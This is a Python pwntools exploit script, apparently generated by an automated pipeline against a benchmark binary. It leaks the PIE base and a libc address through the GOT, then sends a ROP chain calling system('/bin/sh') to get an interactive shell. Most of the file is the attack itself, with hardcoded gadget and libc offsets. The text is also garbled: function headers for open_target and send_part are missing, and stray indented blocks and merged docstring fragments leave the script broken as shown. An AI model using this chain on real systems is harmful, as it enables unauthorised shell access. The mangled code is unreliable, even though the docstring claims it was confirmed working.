"""
GOT-leak ret2libc for pie_leak_ret2libc

Generated by supwngo's canonical autopwn pipeline (technique: ret2libc_leak).
This script was executed end to end and independently confirmed working
during the automated run that produced it.


Two stages through the same overflow:
  1. puts-style call on &got[puts] to reveal libc's load
     base, returning into vuln() so the target reads again;
  2. system("/bin/sh") at the now-known libc address.

libc offsets are those of the libc this target loads locally.
"""
import os
import re
import time

from pwn import *

BINARY = "/srv/share/dev/supwngo/.claude/worktrees/agent-a4b4d5e56ab5e05c5/benchmark/corpus/03_pie_leak_ret2libc/pie_leak_ret2libc"

REMOTE_PORT = 0
SETTLE = 0.12

    # The absolute path above is where the target lived when this script was
    # generated. Fall back to a binary of the same name sitting next to this
    # script, so the artifact stays runnable after being copied elsewhere
    # (handed to a teammate, checked in as a regression fixture, ...).
    _beside = os.path.join(
        os.path.dirname(os.path.abspath(__file__)), os.path.basename(BINARY)
    )
    if os.path.exists(_beside):
        BINARY = _beside

context.binary = BINARY
context.arch = "amd64"
context.log_level = "info"

elf = ELF(BINARY, checksec=False)

    """Local process (run from the binary's own directory, so relative
    paths the target opens behave as they would by hand) or remote tube.

    Deliberately not called `start`/`conn`/`io`: exploit bodies routinely
    bind short local names, and a collision only surfaces as an
    UnboundLocalError the second time the factory is called.

    the one that consumes the following part.

    Without this pause a buffered-stdio reader (scanf/fgets) fills its
    4096-byte FILE buffer from the pipe in one go and a subsequent raw
    read(0, ...) sees EOF - the exploit then silently does nothing.
    """
    io.send(data)
    time.sleep(SETTLE)


def exploit():
    io = open_target()
    offset = 72

    # --- stage 0: defeat PIE -------------------------------------
    # The target prints a code pointer. Its symbol was identified at
    # generation time by page alignment (a PIE load base is always
    # page-aligned), so the printed value minus that symbol's offset
    # is the image base.
    leak_symbol_offset = 0x11d2   # vuln
    banner = io.recvrepeat(0.4)
    printed = [int(m, 16) for m in re.findall(rb"0x([0-9a-fA-F]{6,16})", banner)]
    printed = [v for v in printed if (v & 0xFFF) == (leak_symbol_offset & 0xFFF)]
    if not printed:
        log.failure("target printed no usable code pointer")
        return
    image_base = printed[0] - leak_symbol_offset
    log.success(f"image base: {image_base:#x}")

    # --- stage 1: leak a libc address out of the GOT --------------
    pop_rdi = image_base + 0x11cd
    got_slot = image_base + 0x3fb0   # &got[puts]
    plt_slot = image_base + 0x1094   # puts@plt
    reentry = image_base + 0x11d2   # vuln(), which reads again

    # Calling the output function on its *own* GOT slot works even
    # under lazy binding: the PLT stub resolves the slot before the
    # callee dereferences rdi.
    chain = p64(pop_rdi) + p64(got_slot) + p64(plt_slot) + p64(reentry)
    send_part(io, b"A" * offset + chain + b"\n")

    # Locate the leaked pointer without depending on the target's
    # prompts or on libc landing in any particular range: try every
    # 6-byte window and keep the one that implies a *page-aligned*
    # libc base. A shared library is always mapped on a page boundary,
    # so that single test rejects prompt text and partial reads alike.
    leak_offset = 0x80e10   # puts within libc
    resp = io.recvrepeat(0.5)
    leaked = 0
    for i in range(max(0, len(resp) - 5)):
        candidate = u64(resp[i:i + 6].ljust(8, b"\x00"))
        if not (0x100000000000 <= candidate < 0x800000000000):
            continue
        if (candidate - leak_offset) & 0xFFF:
            continue
        leaked = candidate
        break
    if not leaked:
        log.failure("no libc pointer in the leak response")
        return
    libc_base = leaked - leak_offset
    log.success(f"libc base: {libc_base:#x}")

    # --- stage 2: system("/bin/sh") out of libc -------------------
    system = libc_base + 0x50d70
    binsh = libc_base + 0x1d8678

    chain = b""
    chain += p64(image_base + 0x101a)   # stack-parity flip for do_system's movaps
    chain += p64(pop_rdi) + p64(binsh)
    chain += p64(system)
    send_part(io, b"A" * offset + chain + b"\n")
    io.interactive()
